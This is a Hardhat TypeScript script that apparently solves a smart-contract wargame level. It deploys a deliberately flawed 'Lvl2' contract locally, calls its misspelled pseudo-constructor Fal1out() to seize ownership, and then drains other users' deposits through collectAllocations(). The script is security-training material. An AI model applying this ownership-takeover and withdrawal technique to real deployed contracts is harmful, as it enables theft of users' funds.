import { ethers } from "hardhat";
import { Lvl2 } from "../../typechain";
import dotenv from "dotenv";
dotenv.config();

/**
 * The vulnerability in level 2 resides in the pseudo constructor function Fallout() that attributes the owner role
 * to everyone that sends ETH to this function.
 * Thus, the collectAllocations() function can be called after that, and all the contract funds withdrawn.
 */
async function main() {
  const accounts = await ethers.getSigners();
  const ownAddress = accounts[0].address;
  const provider = ethers.provider;
  const contractFactory = await ethers.getContractFactory("Lvl2");

  console.log("Deploying contract...");
  const contract = (await contractFactory
    .connect(accounts[2])
    .deploy()) as Lvl2;
  console.log("Awaiting confirmations...");
  await contract.deployed();
  console.log(`Contract deployed locally at ${contract.address}`);
  const prevContractBalance = await provider.getBalance(contract.address);
  console.log(
    `Previous contract balance : ${ethers.utils.formatEther(
      prevContractBalance
    )} ETH.`
  );
  console.log(`Simulating someone allocate some funds to the contract...`);
  const allocateTx = await contract
    .connect(accounts[1])
    .allocate({ value: ethers.utils.parseEther("10") });
  const afterContractBalance = await provider.getBalance(contract.address);
  console.log(
    `After allocation, contract balance has : ${ethers.utils.formatEther(
      afterContractBalance
    )} ETH.`
  );

  console.log(
    "Calling the vulnerable Fallout() function that serves as a constructor..."
  );
  const vulnerableTx = await contract.Fal1out({
    value: ethers.utils.parseEther("1"),
  });
  vulnerableTx.wait();
  console.log("Withdrawing...");
  const withdrawTx = await contract.collectAllocations();
  await withdrawTx.wait();
  const newContractBalance = await provider.getBalance(contract.address);
  console.log(
    `New contract balance : ${ethers.utils.formatEther(
      newContractBalance
    )} ETH.`
  );
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
